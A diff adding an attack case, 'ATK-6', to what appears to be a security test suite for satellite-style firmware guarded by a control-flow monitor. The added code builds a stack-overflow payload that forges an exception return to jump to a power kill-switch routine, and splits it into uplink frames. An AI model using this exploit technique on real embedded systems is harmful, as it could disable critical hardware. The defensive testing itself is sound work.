@@ -16,6 +16,7 @@ Stack layout of tc_handle_frame(), measured from the first byte of ctx.buf
 """
 from __future__ import annotations
 
+import re
 import struct
 import subprocess
 
@@ -28,6 +29,8 @@ OFF_ROP_PC = 88
 APID_ADCS_MODE = 0x10
 APID_PARAM_SET = 0x50
 APID_PRIV_WRITE = 0x60
+APID_WD_LOAD = 0x70
+APID_WD_FIRE = 0x71
 AUTH_FLAG_INDEX = 8      # g_state.params[8] IS g_state.authenticated
 
 
@@ -112,6 +115,47 @@ def atk5_privileged_call(sym) -> bytes:
     _place(p, OFF_SAVED_R7, 0x20000000)
     _place(p, OFF_SAVED_LR, sym.thumb("priv_raw_write_body"))
     return bytes(p)
+
+
+# --------------------------------------------------------------------------
+# ATK-6 - Forged exception return.
+#
+# The only attack here that executes in exception context. The safety-monitor
+# interrupt handler copies the armed watchdog message into a 16-byte buffer on
+# its own stack without checking the length. The handler is entered straight
+# from the vector table, so exactly one frame separates that buffer from the
+# value its epilogue pops into the PC:
+#
+#     offset  0..15   local[16]
+#     offset 16       saved r7
+#     offset 20       saved LR = EXC_RETURN (0xFFFFFFFD)
+#
+# Overwriting offset 20 with a code address means `pop {r7, pc}` never leaves
+# exception context: it jumps to the attacker's target instead.
+#
+# No control-flow graph contains this transfer, because no CFG contains any
+# exception return. A monitor that exempts exception returns - as this one did
+# before the shadow stack was added - accepts it silently.
+# --------------------------------------------------------------------------
+OFF_WD_EXC_RETURN = 20
+WD_PAYLOAD_LEN = 24
+
+
+def atk6_forged_exception_return(sym) -> bytes:
+    p = _canvas(WD_PAYLOAD_LEN, b"C")
+    _place(p, OFF_WD_EXC_RETURN, sym.thumb("eps_kill_switch"))
+    return bytes(p)
+
+
+def atk6_frames(sym, seg: int = 48) -> list[tuple[int, bytes]]:
+    """Load the message, then arm it. Segmenting the uplink is ordinary on a
+    space link, and here it also keeps each frame inside the parser's buffer
+    so that loading the message does not itself trip ATK-1."""
+    payload = atk6_forged_exception_return(sym)
+    out = [(APID_WD_LOAD, bytes([off]) + payload[off:off + seg])
+           for off in range(0, len(payload), seg)]
+    out.append((APID_WD_FIRE, bytes([len(payload)])))
+    return out
 
 
 # --------------------------------------------------------------------------
